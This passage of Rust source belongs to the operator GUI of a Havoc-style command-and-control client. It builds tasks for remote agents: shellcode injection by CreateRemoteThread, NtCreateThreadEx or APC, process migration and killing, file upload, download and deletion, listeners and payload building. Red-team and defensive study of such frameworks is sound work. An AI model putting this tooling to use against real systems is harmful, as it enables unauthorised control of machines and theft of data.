                            Color32::from_rgba_unmultiplied(80, 180, 220, 18)
                        } else {
                            Color32::TRANSPARENT
                        };

                        let row_response = egui::Frame::default()
                            .fill(bg)
                            .inner_margin(egui::Margin::symmetric(6, 3))
                            .show(ui, |ui| {
                                egui::Grid::new(("process-tab-row", agent_id, row.pid))
                                    .num_columns(7)
                                    .spacing([12.0, 3.0])
                                    .show(ui, |ui| {
                                        let name_color = if is_agent {
                                            Color32::from_rgb(255, 85, 85)
                                        } else {
                                            Color32::from_rgb(220, 220, 220)
                                        };
                                        ui.label(RichText::new(&row.name).color(name_color));
                                        ui.monospace(row.pid.to_string());
                                        ui.monospace(row.ppid.to_string());
                                        ui.label(row.session.to_string());
                                        ui.label(&row.arch);
                                        ui.label(blank_if_empty(&row.user, "unknown"));
                                        ui.horizontal_wrapped(|ui| {
                                            if ui.small_button("Kill").clicked() {
                                                self.queue_process_kill(agent_id, row.pid);
                                            }
                                            if ui.small_button("Inject").clicked() {
                                                self.open_process_injection_dialog(
                                                    agent_id,
                                                    row,
                                                    InjectionTargetAction::Inject,
                                                );
                                            }
                                            if ui.small_button("Migrate").clicked() {
                                                self.open_process_injection_dialog(
                                                    agent_id,
                                                    row,
                                                    InjectionTargetAction::Migrate,
                                                );
                                            }
                                        });
                                        ui.end_row();
                                    });
                            });

                        // Right-click context menu on each row
                        row_response.response.context_menu(|ui| {
                            ui.label(
                                RichText::new(format!("{} (PID {})", row.name, row.pid))
                                    .strong(),
                            );
                            ui.separator();
                            if ui.button("Kill Process").clicked() {
                                self.queue_process_kill(agent_id, row.pid);
                                ui.close();
                            }
                            if ui.button("Inject Shellcode").clicked() {
                                self.open_process_injection_dialog(
                                    agent_id,
                                    row,
                                    InjectionTargetAction::Inject,
                                );
                                ui.close();
                            }
                            if ui.button("Migrate").clicked() {
                                self.open_process_injection_dialog(
                                    agent_id,
                                    row,
                                    InjectionTargetAction::Migrate,
                                );
                                ui.close();
                            }
                        });

                        ui.add_space(1.0);
                    }
                });
        });
    }

    fn open_process_injection_dialog(
        &mut self,
        agent_id: &str,
        row: &ProcessEntry,
        action: InjectionTargetAction,
    ) {
        self.session_panel.process_injection = Some(ProcessInjectionDialogState {
            agent_id: agent_id.to_owned(),
            pid: row.pid,
            process_name: row.name.clone(),
            arch: row.arch.clone(),
            action,
            technique: InjectionTechnique::Default,
            shellcode_path: String::new(),
            arguments: String::new(),
            status_message: None,
        });
    }

    fn render_process_injection_dialog(&mut self, ctx: &egui::Context) {
        let Some(dialog) = &mut self.session_panel.process_injection else {
            return;
        };

        let mut keep_open = true;
        let mut queue_task = false;
        let mut cancel = false;

        egui::Window::new(format!("{} {}", dialog.action.label(), dialog.process_name))
            .collapsible(false)
            .resizable(true)
            .default_size([480.0, 220.0])
            .open(&mut keep_open)
            .show(ctx, |ui| {
                ui.label(format!(
                    "{} into PID {} ({}, {})",
                    dialog.action.label(),
                    dialog.pid,
                    dialog.process_name,
                    dialog.arch
                ));
                ui.add_space(8.0);
                ui.horizontal(|ui| {
                    ui.label("Technique");
                    egui::ComboBox::from_id_salt((
                        "inject-technique",
                        dialog.agent_id.as_str(),
                        dialog.pid,
                    ))
                    .selected_text(match dialog.technique {
                        InjectionTechnique::Default => "Default",
                        InjectionTechnique::CreateRemoteThread => "CreateRemoteThread",
                        InjectionTechnique::NtCreateThreadEx => "NtCreateThreadEx",
                        InjectionTechnique::NtQueueApcThread => "NtQueueApcThread",
                    })
                    .show_ui(ui, |ui| {
                        for (value, label) in InjectionTechnique::ALL {
                            ui.selectable_value(&mut dialog.technique, value, label);
                        }
                    });
                });
                ui.add_space(6.0);
                ui.horizontal(|ui| {
                    ui.label("Shellcode");
                    ui.add(
                        egui::TextEdit::singleline(&mut dialog.shellcode_path)
                            .desired_width(260.0)
                            .hint_text("/path/to/payload.bin"),
                    );
                    if ui.button("Browse").clicked() {
                        if let Some(path) = FileDialog::new().pick_file() {
                            dialog.shellcode_path = path.display().to_string();
                        }
                    }
                });
                ui.add_space(6.0);
                ui.label("Arguments");
                ui.add(
                    egui::TextEdit::singleline(&mut dialog.arguments)
                        .desired_width(f32::INFINITY)
                        .hint_text("Optional arguments passed to the payload"),
                );
                if let Some(message) = &dialog.status_message {
                    ui.add_space(6.0);
                    ui.label(RichText::new(message).weak());
                }
                ui.add_space(8.0);
                ui.horizontal(|ui| {
                    if ui.button(dialog.action.label()).clicked() {
                        queue_task = true;
                    }
                    if ui.button("Cancel").clicked() {
                        cancel = true;
                    }
                });
            });

        if queue_task {
            self.submit_process_injection();
            ctx.request_repaint();
        } else if cancel || !keep_open {
            self.session_panel.process_injection = None;
        }
    }

    fn render_note_editor(&mut self, ctx: &egui::Context, app_state: &SharedAppState) {
        let Some(editor) = &mut self.session_panel.note_editor else {
            return;
        };

        let mut keep_open = true;
        let mut save_note = false;
        let mut cancel_note = false;
        let title = format!("Agent Note {}", editor.agent_id);
        egui::Window::new(title)
            .collapsible(false)
            .resizable(true)
            .default_size([420.0, 220.0])
            .open(&mut keep_open)
            .show(ctx, |ui| {
                ui.label("Operator note");
                ui.add(
                    egui::TextEdit::multiline(&mut editor.note)
                        .desired_rows(8)
                        .hint_text("Add operator context for this agent"),
                );
                ui.add_space(8.0);
                ui.horizontal(|ui| {
                    if ui.button("Save").clicked() {
                        save_note = true;
                    }
                    if ui.button("Cancel").clicked() {
                        cancel_note = true;
                    }
                });
            });

        if save_note {
            let agent_id = editor.agent_id.clone();
            let note = editor.note.trim().to_owned();
            let operator = match app_state.lock() {
                Ok(mut state) => {
                    state.update_agent_note(&agent_id, note.clone());
                    state
                        .operator_info
                        .as_ref()
                        .map(|operator| operator.username.clone())
                        .unwrap_or_default()
                }
                Err(poisoned) => {
                    let mut state = poisoned.into_inner();
                    state.update_agent_note(&agent_id, note.clone());
                    state
                        .operator_info
                        .as_ref()
                        .map(|operator| operator.username.clone())
                        .unwrap_or_default()
                }
            };
            self.session_panel.pending_messages.push(build_note_task(&agent_id, &note, &operator));
            self.session_panel.status_message = Some(format!("Updated note for {agent_id}."));
            self.session_panel.note_editor = None;
            ctx.request_repaint();
        } else if cancel_note || !keep_open {
            self.session_panel.note_editor = None;
        }
    }

    fn submit_console_command(&mut self, agent_id: &str) {
        let operator = self.current_operator_username();
        let python_runtime = self.python_runtime.clone();

        let console = self.session_panel.console_state_mut(agent_id);
        let command_line = console.input.trim().to_owned();
        if command_line.is_empty() {
            return;
        }

        // Handle local client-side commands first.
        if let Some(output) = handle_local_command(&command_line) {
            push_history_entry(console, &command_line);
            console.input.clear();
            self.inject_console_entry(agent_id, &command_line, &output);
            return;
        }

        if let Some(runtime) = python_runtime {
            match runtime.execute_registered_command(agent_id, &command_line) {
                Ok(true) => {
                    push_history_entry(console, &command_line);
                    console.input.clear();
                    console.status_message =
                        Some(format!("Executed script command `{command_line}`."));
                    return;
                }
                Ok(false) => {}
                Err(error) => {
                    console.status_message =
                        Some(format!("Script command `{command_line}` failed: {error}"));
                    return;
                }
            }
        }

        match build_console_task(agent_id, &command_line, &operator) {
            Ok(message) => {
                push_history_entry(console, &command_line);
                console.input.clear();
                console.status_message = Some(format!("Queued `{command_line}`."));
                self.session_panel.pending_messages.push(message);
            }
            Err(error) => {
                console.status_message = Some(error);
            }
        }
    }

    /// Inserts a locally-generated console entry into the shared app state.
    fn inject_console_entry(&self, agent_id: &str, command_line: &str, output: &str) {
        let app_state = match &self.phase {
            AppPhase::Connected { app_state, .. } | AppPhase::Authenticating { app_state, .. } => {
                app_state
            }
            AppPhase::Login(_) => return,
        };
        let mut state = match app_state.lock() {
            Ok(state) => state,
            Err(poisoned) => poisoned.into_inner(),
        };
        state.agent_consoles.entry(agent_id.to_owned()).or_default().push(AgentConsoleEntry {
            kind: AgentConsoleEntryKind::Output,
            command_id: "local".to_owned(),
            received_at: String::new(),
            command_line: Some(command_line.to_owned()),
            output: output.to_owned(),
        });
    }

    fn current_operator_username(&self) -> String {
        match &self.phase {
            AppPhase::Connected { app_state, .. } | AppPhase::Authenticating { app_state, .. } => {
                let snapshot = Self::snapshot(app_state);
                snapshot.operator_info.map(|info| info.username).unwrap_or_default()
            }
            AppPhase::Login(_) => String::new(),
        }
    }

    fn build_file_browser_list_message(
        &self,
        agent_id: &str,
        path: &str,
    ) -> Option<OperatorMessage> {
        Some(build_file_browser_list_task(agent_id, path, &self.current_operator_username()))
    }

    fn queue_process_refresh(&mut self, agent_id: &str) {
        let message = build_process_list_task(agent_id, &self.current_operator_username());
        self.session_panel.process_state_mut(agent_id).status_message =
            Some("Queued `ps`.".to_owned());
        self.session_panel.pending_messages.push(message);
    }

    fn queue_process_kill(&mut self, agent_id: &str, pid: u32) {
        let message = build_process_kill_task(agent_id, pid, &self.current_operator_username());
        self.session_panel.process_state_mut(agent_id).status_message =
            Some(format!("Queued process kill for PID {pid}."));
        self.session_panel.pending_messages.push(message);
    }

    fn submit_process_injection(&mut self) {
        let Some(dialog) = self.session_panel.process_injection.clone() else {
            return;
        };

        let shellcode_path = dialog.shellcode_path.trim();
        if shellcode_path.is_empty() {
            if let Some(dialog_state) = self.session_panel.process_injection.as_mut() {
                dialog_state.status_message = Some("Select a shellcode file first.".to_owned());
            }
            return;
        }

        match std::fs::read(shellcode_path) {
            Ok(binary) => {
                let operator = self.current_operator_username();
                let message = build_process_injection_task(
                    &dialog.agent_id,
                    dialog.pid,
                    &dialog.arch,
                    dialog.technique,
                    &binary,
                    &dialog.arguments,
                    dialog.action,
                    &operator,
                );
                self.session_panel.process_state_mut(&dialog.agent_id).status_message =
                    Some(format!(
                        "Queued {} for PID {}.",
                        dialog.action.label().to_ascii_lowercase(),
                        dialog.pid
                    ));
                self.session_panel.pending_messages.push(message);
                self.session_panel.process_injection = None;
            }
            Err(error) => {
                if let Some(dialog_state) = self.session_panel.process_injection.as_mut() {
                    dialog_state.status_message =
                        Some(format!("Failed to read shellcode file: {error}"));
                }
            }
        }
    }

    fn queue_file_browser_pwd(&mut self, agent_id: &str) {
        let message = build_file_browser_pwd_task(agent_id, &self.current_operator_username());
        self.session_panel.file_browser_state_mut(agent_id).status_message =
            Some("Queued `pwd`.".to_owned());
        self.session_panel.pending_messages.push(message);
    }

    fn queue_file_browser_list(&mut self, agent_id: &str, path: &str) {
        if let Some(message) = self.build_file_browser_list_message(agent_id, path) {
            let ui_state = self.session_panel.file_browser_state_mut(agent_id);
            ui_state.pending_dirs.insert(path.to_owned());
            ui_state.status_message = Some(format!("Queued listing for {path}."));
            self.session_panel.pending_messages.push(message);
        }
    }

    fn queue_file_browser_cd(&mut self, agent_id: &str, path: &str) {
        let message = build_file_browser_cd_task(agent_id, path, &self.current_operator_username());
        self.session_panel.file_browser_state_mut(agent_id).status_message =
            Some(format!("Queued directory change to {path}."));
        self.session_panel.pending_messages.push(message);
    }

    fn queue_file_browser_download(&mut self, agent_id: &str, path: &str) {
        let message =
            build_file_browser_download_task(agent_id, path, &self.current_operator_username());
        self.session_panel.file_browser_state_mut(agent_id).status_message =
            Some(format!("Queued download for {path}."));
        self.session_panel.pending_messages.push(message);
    }

    fn queue_file_browser_delete(&mut self, agent_id: &str, path: &str) {
        let message =
            build_file_browser_delete_task(agent_id, path, &self.current_operator_username());
        self.session_panel.file_browser_state_mut(agent_id).status_message =
            Some(format!("Queued delete for {path}."));
        self.session_panel.pending_messages.push(message);
    }

    fn queue_file_browser_upload(&mut self, agent_id: &str, destination_dir: Option<String>) {
        let Some(destination_dir) = destination_dir else {
            self.session_panel.file_browser_state_mut(agent_id).status_message = Some(
                "Select a directory or resolve the current working directory first.".to_owned(),
            );
            return;
        };

        let Some(local_path) = FileDialog::new().pick_file() else {
            return;
        };

        match std::fs::read(&local_path) {
            Ok(bytes) => {
                let file_name =
                    local_path.file_name().and_then(|value| value.to_str()).unwrap_or("upload.bin");
                let remote_path = join_remote_path(&destination_dir, file_name);
                let message = build_file_browser_upload_task(
                    agent_id,
                    &remote_path,
                    &bytes,
                    &self.current_operator_username(),
                );
                self.session_panel.file_browser_state_mut(agent_id).status_message =
                    Some(format!("Queued upload to {remote_path}."));
                self.session_panel.pending_messages.push(message);
            }
            Err(error) => {
                self.session_panel.file_browser_state_mut(agent_id).status_message =
                    Some(format!("Failed to read local file: {error}"));
            }
        }
    }

    fn flush_pending_messages(&mut self) {
        if self.session_panel.pending_messages.is_empty() {
            return;
        }

        let Some(outgoing_tx) = &self.outgoing_tx else {
            self.session_panel.status_message = Some(
                "Session action could not be sent because the transport is unavailable.".to_owned(),
            );
            self.session_panel.pending_messages.clear();
            return;
        };

        for message in self.session_panel.pending_messages.drain(..) {
            if outgoing_tx.send(message).is_err() {
                self.session_panel.status_message =
                    Some("Session action could not be queued for delivery.".to_owned());
                break;
            }
        }
    }
}

impl eframe::App for ClientApp {
    fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
        match &self.phase {
            AppPhase::Login(_) => {
                let AppPhase::Login(login_state) = &mut self.phase else {
                    return;
                };
                let action = render_login_dialog(ctx, login_state);
                match action {
                    LoginAction::Submit => {
                        self.handle_login_submit(ctx);
                    }
                    LoginAction::TrustCertificate(fingerprint)
                    | LoginAction::AcceptChangedCertificate(fingerprint) => {
                        self.handle_trust_certificate(fingerprint);
                        self.handle_login_submit(ctx);
                    }
                    LoginAction::Waiting => {}
                }
            }
            AppPhase::Authenticating { app_state, .. } => {
                let app_state_ref = app_state.clone();
                self.check_auth_response();
                self.render_current_phase(ctx, Some(app_state_ref));
            }
            AppPhase::Connected { app_state, .. } => {
                let app_state_ref = app_state.clone();
                self.render_main_ui(ctx, &app_state_ref);
            }
        }
    }
}

/// Validate that a certificate fingerprint is a well-formed SHA-256 hex digest.
///
/// Returns the fingerprint unchanged if valid, or an error describing why it is malformed.
fn validate_fingerprint(fingerprint: &str, source: &str) -> Result<String> {
    if fingerprint.len() != 64 {
        return Err(anyhow!(
            "invalid certificate fingerprint from {source}: expected 64 hex characters \
             (SHA-256 digest), got {} characters",
            fingerprint.len()
        ));
    }
    if !fingerprint.bytes().all(|b| b.is_ascii_hexdigit()) {
        return Err(anyhow!(
            "invalid certificate fingerprint from {source}: contains non-hex characters"
        ));
    }
    Ok(fingerprint.to_owned())
}

/// Determine the TLS verification mode from CLI flags, falling back to known-servers
/// TOFU store, then local config.
///
/// Precedence: CLI `--accept-invalid-certs` > CLI `--cert-fingerprint` > CLI `--ca-cert`
///           > known-servers TOFU store > config `cert_fingerprint` > config `ca_cert`
///           > system root CAs (with fingerprint capture for TOFU prompts).
///
/// Returns an error if a provided fingerprint is not a valid SHA-256 hex digest.
fn resolve_tls_verification(
    cli: &Cli,
    config: &LocalConfig,
    known_servers: &KnownServersStore,
    server_url: &str,
) -> Result<TlsVerification> {
    if cli.accept_invalid_certs {
        tracing::warn!("--accept-invalid-certs is deprecated; TOFU is now the default TLS mode");
        return Ok(TlsVerification::DangerousSkipVerify);
    }
    if let Some(fingerprint) = &cli.cert_fingerprint {
        let validated = validate_fingerprint(fingerprint, "--cert-fingerprint")?;
        return Ok(TlsVerification::Fingerprint(validated));
    }
    if let Some(ca_path) = &cli.ca_cert {
        return Ok(TlsVerification::CustomCa(ca_path.clone()));
    }
    // TOFU: check the known-servers store for a previously trusted fingerprint.
    if let Some(host_port) = host_port_from_url(server_url) {
        if let Some(entry) = known_servers.lookup(&host_port) {
            return Ok(TlsVerification::Fingerprint(entry.fingerprint.clone()));
        }
    }
    if let Some(fingerprint) = &config.cert_fingerprint {
        let validated = validate_fingerprint(fingerprint, "config file")?;
        return Ok(TlsVerification::Fingerprint(validated));
    }
    if let Some(ca_path) = &config.ca_cert {
        return Ok(TlsVerification::CustomCa(ca_path.clone()));
    }
    // Default: standard CA verification with fingerprint capture.
    // For self-signed teamservers this will fail with UnknownIssuer,
    // triggering the TOFU prompt in the login UI.
    Ok(TlsVerification::CertificateAuthority)
}

/// Build an egui `Visuals` matching Havoc C2's dark navy theme.
fn havoc_dark_theme() -> egui::Visuals {
    let mut visuals = egui::Visuals::dark();

    // Havoc background: dark navy (~#1a1a2e / #16162a)
    let bg_dark = Color32::from_rgb(22, 22, 42);
    let bg_panel = Color32::from_rgb(26, 26, 46);
    let bg_widget = Color32::from_rgb(36, 36, 60);
    let bg_widget_hover = Color32::from_rgb(46, 46, 76);
    let bg_widget_active = Color32::from_rgb(56, 56, 90);
    let accent = Color32::from_rgb(140, 80, 200); // purple accent
    let text_primary = Color32::from_rgb(220, 220, 230);
    let text_secondary = Color32::from_rgb(160, 160, 180);

    visuals.panel_fill = bg_panel;
    visuals.window_fill = bg_dark;
    visuals.extreme_bg_color = bg_dark;
    visuals.faint_bg_color = Color32::from_rgb(30, 30, 50);

    // Widget styles
    visuals.widgets.noninteractive.bg_fill = bg_panel;
    visuals.widgets.noninteractive.fg_stroke = Stroke::new(1.0, text_secondary);
    visuals.widgets.noninteractive.bg_stroke = Stroke::new(1.0, Color32::from_rgb(50, 50, 70));

    visuals.widgets.inactive.bg_fill = bg_widget;
    visuals.widgets.inactive.fg_stroke = Stroke::new(1.0, text_primary);
    visuals.widgets.inactive.bg_stroke = Stroke::new(1.0, Color32::from_rgb(60, 60, 80));

    visuals.widgets.hovered.bg_fill = bg_widget_hover;
    visuals.widgets.hovered.fg_stroke = Stroke::new(1.5, Color32::WHITE);
    visuals.widgets.hovered.bg_stroke = Stroke::new(1.0, accent);

    visuals.widgets.active.bg_fill = bg_widget_active;
    visuals.widgets.active.fg_stroke = Stroke::new(2.0, Color32::WHITE);
    visuals.widgets.active.bg_stroke = Stroke::new(1.0, accent);

    visuals.selection.bg_fill = Color32::from_rgba_unmultiplied(140, 80, 200, 80);
    visuals.selection.stroke = Stroke::new(1.0, accent);

    // Window shadow + separator
    visuals.window_shadow =
        egui::Shadow { offset: [0, 2], blur: 8, spread: 0, color: Color32::from_black_alpha(120) };
    visuals.popup_shadow = visuals.window_shadow;

    visuals.override_text_color = Some(text_primary);

    visuals
}

fn main() -> Result<()> {
    let cli = Cli::parse();

    // Handle --purge-known-server: remove the entry and exit.
    if let Some(host_port) = &cli.purge_known_server {
        let mut store = KnownServersStore::load();
        if store.remove(host_port) {
            store.save().map_err(|e| anyhow::anyhow!("failed to save known-servers: {e}"))?;
            println!("Removed {host_port} from known servers.");
        } else {
            println!("No entry found for {host_port} in known servers.");
        }
        return Ok(());
    }

    launch_client(cli)
}

fn launch_client(cli: Cli) -> Result<()> {
    let options = eframe::NativeOptions {
        viewport: egui::ViewportBuilder::default()
            .with_inner_size(INITIAL_WINDOW_SIZE)
            .with_min_inner_size(MINIMUM_WINDOW_SIZE),
        ..Default::default()
    };

    eframe::run_native(
        WINDOW_TITLE,
        options,
        Box::new(move |creation_context| {
            creation_context.egui_ctx.set_visuals(havoc_dark_theme());
            let app = ClientApp::new(cli)
                .map_err(|e| -> Box<dyn std::error::Error + Send + Sync> { e.into() })?;
            Ok(Box::new(app) as Box<dyn eframe::App>)
        }),
    )
    .map_err(|error| anyhow!("failed to start egui application: {error}"))
}

/// Returns the display colour for an operator role badge.
fn role_badge_color(role: Option<&str>) -> Color32 {
    match role.map(|r| r.to_ascii_lowercase()).as_deref() {
        Some("admin") => Color32::from_rgb(220, 80, 60),
        Some("operator") => Color32::from_rgb(60, 130, 220),
        Some("readonly") | Some("read-only") | Some("analyst") => Color32::from_rgb(100, 180, 100),
        _ => Color32::from_rgb(140, 140, 140),
    }
}

/// Renders a small coloured role badge inline.
#[allow(dead_code)]
fn role_badge(ui: &mut egui::Ui, role: Option<&str>) {
    let label = role.unwrap_or("unassigned");
    let color = role_badge_color(role);
    let text = RichText::new(label).color(Color32::WHITE).small().strong();
    let frame = egui::Frame::new()
        .fill(color)
        .inner_margin(egui::Margin::symmetric(4, 2))
        .corner_radius(egui::CornerRadius::same(4));
    frame.show(ui, |ui| {
        ui.label(text);
    });
}

/// Renders a single operator entry in the connected-operators list.
#[allow(dead_code)]
fn render_operator_entry(ui: &mut egui::Ui, username: &str, op: &ConnectedOperatorState) {
    egui::Frame::new().inner_margin(egui::Margin::symmetric(0, 2)).show(ui, |ui| {
        ui.horizontal(|ui| {
            let status_color = if op.online {
                Color32::from_rgb(80, 200, 120)
            } else {
                Color32::from_rgb(160, 160, 160)
            };
            ui.colored_label(status_color, "●");
            ui.strong(username);
            role_badge(ui, op.role.as_deref());
        });
        if let Some(ts) = &op.last_seen {
            ui.label(RichText::new(format!("last seen: {ts}")).small().weak());
        }
        if !op.recent_commands.is_empty() {
            ui.label(RichText::new("Recent commands:").small().italics());
            for cmd in op.recent_commands.iter().take(5) {
                ui.horizontal(|ui| {
                    ui.add_space(8.0);
                    ui.label(
                        RichText::new(format!(
                            "[{}] {} — {}",
                            cmd.agent_id, cmd.command_line, cmd.timestamp
                        ))
                        .small()
                        .weak(),
                    );
                });
            }
        }
    });
}

fn script_status_label(status: ScriptLoadStatus) -> &'static str {
    match status {
        ScriptLoadStatus::Loaded => "loaded",
        ScriptLoadStatus::Error => "error",
        ScriptLoadStatus::Unloaded => "unloaded",
    }
}

fn script_status_color(status: ScriptLoadStatus) -> Color32 {
    match status {
        ScriptLoadStatus::Loaded => Color32::from_rgb(110, 199, 141),
        ScriptLoadStatus::Error => Color32::from_rgb(215, 83, 83),
        ScriptLoadStatus::Unloaded => Color32::from_rgb(232, 182, 83),
    }
}

fn script_output_label(stream: ScriptOutputStream) -> &'static str {
    match stream {
        ScriptOutputStream::Stdout => "stdout",
        ScriptOutputStream::Stderr => "stderr",
    }
}

fn script_output_color(stream: ScriptOutputStream) -> Color32 {
    match stream {
        ScriptOutputStream::Stdout => Color32::from_rgb(110, 199, 141),
        ScriptOutputStream::Stderr => Color32::from_rgb(215, 83, 83),
    }
}

fn script_name_for_display(path: &Path) -> Option<String> {
    path.file_stem().and_then(|stem| stem.to_str()).map(str::to_owned)
}

fn build_kill_task(agent_id: &str, operator: &str) -> OperatorMessage {
    build_agent_task(
        operator,
        AgentTaskInfo {
            demon_id: agent_id.to_owned(),
            task_id: format!("{:08X}", next_task_id()),
            command_id: u32::from(DemonCommand::CommandExit).to_string(),
            command_line: "kill".to_owned(),
            command: Some("kill".to_owned()),
            ..AgentTaskInfo::default()
        },
    )
}

fn build_process_list_task(agent_id: &str, operator: &str) -> OperatorMessage {
    build_agent_task(
        operator,
        AgentTaskInfo {
            demon_id: agent_id.to_owned(),
            task_id: format!("{:08X}", next_task_id()),
            command_id: u32::from(DemonCommand::CommandProcList).to_string(),
            command_line: "ps".to_owned(),
            command: Some("ps".to_owned()),
            extra: BTreeMap::from([(
                "FromProcessManager".to_owned(),
                serde_json::Value::Bool(true),
            )]),
            ..AgentTaskInfo::default()
        },
    )
}

fn build_process_kill_task(agent_id: &str, pid: u32, operator: &str) -> OperatorMessage {
    build_agent_task(operator, process_kill_info(agent_id, pid))
}

fn build_process_injection_task(
    agent_id: &str,
    pid: u32,
    arch: &str,
    technique: InjectionTechnique,
    binary: &[u8],
    arguments: &str,
    action: InjectionTargetAction,
    operator: &str,
) -> OperatorMessage {
    let command_line = format!(
        "{} pid={} arch={} {}",
        action.label().to_ascii_lowercase(),
        pid,
        normalized_process_arch(arch),
        human_size(binary.len() as u64)
    );
    build_agent_task(
        operator,
        AgentTaskInfo {
            demon_id: agent_id.to_owned(),
            task_id: format!("{:08X}", next_task_id()),
            command_id: u32::from(DemonCommand::CommandInjectShellcode).to_string(),
            command_line,
            command: Some("shellcode".to_owned()),
            sub_command: Some("inject".to_owned()),
            extra: BTreeMap::from([
                ("Way".to_owned(), serde_json::Value::String("Inject".to_owned())),
                (
                    "Technique".to_owned(),
                    serde_json::Value::String(technique.as_wire_value().to_owned()),
                ),
                ("Arch".to_owned(), serde_json::Value::String(normalized_process_arch(arch))),
                (
                    "Binary".to_owned(),
                    serde_json::Value::String(
                        base64::engine::general_purpose::STANDARD.encode(binary),
                    ),
                ),
                ("PID".to_owned(), serde_json::Value::String(pid.to_string())),
                ("Action".to_owned(), serde_json::Value::String(action.label().to_owned())),
                (
                    "Arguments".to_owned(),
                    serde_json::Value::String(
                        base64::engine::general_purpose::STANDARD.encode(arguments.as_bytes()),
                    ),
                ),
            ]),
            ..AgentTaskInfo::default()
        },
    )
}

fn build_note_task(agent_id: &str, note: &str, operator: &str) -> OperatorMessage {
    build_agent_task(
        operator,
        AgentTaskInfo {
            demon_id: agent_id.to_owned(),
            task_id: format!("{:08X}", next_task_id()),
            command_id: "Teamserver".to_owned(),
            command_line: "note".to_owned(),
            command: Some("note".to_owned()),
            arguments: Some(note.to_owned()),
            ..AgentTaskInfo::default()
        },
    )
}

fn build_chat_message(operator: Option<&str>, message: &str) -> Option<OperatorMessage> {
    let trimmed = message.trim();
    if trimmed.is_empty() {
        return None;
    }

    Some(OperatorMessage::ChatMessage(Message {
        head: MessageHead {
            event: EventCode::Chat,
            user: operator.unwrap_or_default().to_owned(),
            timestamp: String::new(),
            one_time: String::new(),
        },
        info: FlatInfo {
            fields: std::collections::BTreeMap::from([
                (
                    "User".to_owned(),
                    serde_json::Value::String(operator.unwrap_or_default().to_owned()),
                ),
                ("Message".to_owned(), serde_json::Value::String(trimmed.to_owned())),
            ]),
        },
    }))
}

fn build_agent_task(operator: &str, info: AgentTaskInfo) -> OperatorMessage {
    OperatorMessage::AgentTask(Message {
        head: MessageHead {
            event: red_cell_common::operator::EventCode::Session,
            user: operator.to_owned(),
            timestamp: String::new(),
            one_time: String::new(),
        },
        info,
    })
}

fn build_listener_new(info: ListenerInfo, operator: &str) -> OperatorMessage {
    OperatorMessage::ListenerNew(Message {
        head: MessageHead {
            event: EventCode::Listener,
            user: operator.to_owned(),
            timestamp: String::new(),
            one_time: String::new(),
        },
        info,
    })
}

fn build_listener_edit(info: ListenerInfo, operator: &str) -> OperatorMessage {
    OperatorMessage::ListenerEdit(Message {
        head: MessageHead {
            event: EventCode::Listener,
            user: operator.to_owned(),
            timestamp: String::new(),
            one_time: String::new(),
        },
        info,
    })
}

fn build_listener_remove(name: &str, operator: &str) -> OperatorMessage {
    OperatorMessage::ListenerRemove(Message {
        head: MessageHead {
            event: EventCode::Listener,
            user: operator.to_owned(),
            timestamp: String::new(),
            one_time: String::new(),
        },
        info: NameInfo { name: name.to_owned() },
    })
}

fn build_payload_request(dialog: &PayloadDialogState, operator: &str) -> OperatorMessage {
    OperatorMessage::BuildPayloadRequest(Message {
        head: MessageHead {
            event: EventCode::Gate,
            user: operator.to_owned(),
            timestamp: String::new(),
            one_time: String::new(),
        },
        info: BuildPayloadRequestInfo {
            agent_type: dialog.agent_type.clone(),
            listener: dialog.listener.clone(),
            arch: dialog.arch.label().to_owned(),
            format: dialog.format.label().to_owned(),
            config: dialog.config_json(),
        },
    })
}

/// Map a build console message type to a display color.
fn build_console_message_color(message_type: &str) -> Color32 {
    match message_type {
        "Good" => Color32::from_rgb(85, 255, 85),
        "Error" => Color32::from_rgb(255, 85, 85),
        "Warning" => Color32::from_rgb(255, 200, 50),
        _ => Color32::from_rgb(180, 180, 220), // Info / default
    }
}

/// Map a build console message type to a prefix tag (like Havoc's [*] / [+] / [-]).
fn build_console_message_prefix(message_type: &str) -> &'static str {
    match message_type {
        "Good" => "[+]",
        "Error" => "[-]",
        "Warning" => "[!]",
        _ => "[*]",
    }
}

fn next_task_id() -> u32 {
    use std::sync::atomic::{AtomicU32, Ordering};

    static TASK_COUNTER: AtomicU32 = AtomicU32::new(1);
    TASK_COUNTER.fetch_add(1, Ordering::Relaxed)
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum HistoryDirection {
    Older,
    Newer,
}

/// Handles client-side commands that do not require a round-trip to the teamserver.
///
/// Returns `Some(output)` when the input matches a local command, or `None` if the
/// command should be forwarded to the teamserver.
fn handle_local_command(input: &str) -> Option<String> {
    let trimmed = input.trim();
    let mut parts = trimmed.split_whitespace();
    let command = parts.next()?.to_ascii_lowercase();

    match command.as_str() {
        "help" | "?" => {
            let topic = parts.next();
            Some(build_help_output(topic))
        }
        _ => None,
    }
}

/// Builds the formatted help text.
///
/// When `topic` is `None`, a full command table is produced (matching Havoc's
/// `help` output). When a specific command name is given, only that command's
/// usage and description are shown.
fn build_help_output(topic: Option<&str>) -> String {
    if let Some(name) = topic {
        let needle = name.to_ascii_lowercase();
        let spec = CONSOLE_COMMANDS
            .iter()
            .find(|spec| spec.name == needle || spec.aliases.iter().any(|alias| *alias == needle));
        return match spec {
            Some(spec) => {
                let mut out = format!(" {}\n", spec.name);
                out.push_str(&format!("   Usage:       {}\n", spec.usage));
                out.push_str(&format!("   Type:        {}\n", spec.cmd_type));
                out.push_str(&format!("   Description: {}\n", spec.description));
                if !spec.aliases.is_empty() {
                    out.push_str(&format!("   Aliases:     {}\n", spec.aliases.join(", ")));
                }
                out
            }
            None => format!("Unknown command `{name}`. Type `help` for available commands."),
        };
    }

    // Full command table.
    let mut out = String::from(" Demon Commands\n\n");
    out.push_str(&format!(" {:<22} {:<12} {}\n", "Command", "Type", "Description"));
    out.push_str(&format!(" {:<22} {:<12} {}\n", "-------", "----", "-----------"));
    for spec in &CONSOLE_COMMANDS {
        out.push_str(&format!(" {:<22} {:<12} {}\n", spec.name, spec.cmd_type, spec.description));
    }
    out
}

/// Formats the Havoc-style console prompt: `[operator/AGENT_ID] demon.x64 >> `.
fn format_console_prompt(operator: &str, agent_id: &str) -> String {
    let op = if operator.is_empty() { "operator" } else { operator };
    format!("[{op}/{agent_id}] demon.x64 >> ")
}

#[derive(Debug, Clone, Copy)]
struct ConsoleCommandSpec {
    name: &'static str,
    aliases: &'static [&'static str],
    usage: &'static str,
    cmd_type: &'static str,
    description: &'static str,
}

const CONSOLE_COMMANDS: [ConsoleCommandSpec; 28] = [
    ConsoleCommandSpec {
        name: "help",
        aliases: &["?"],
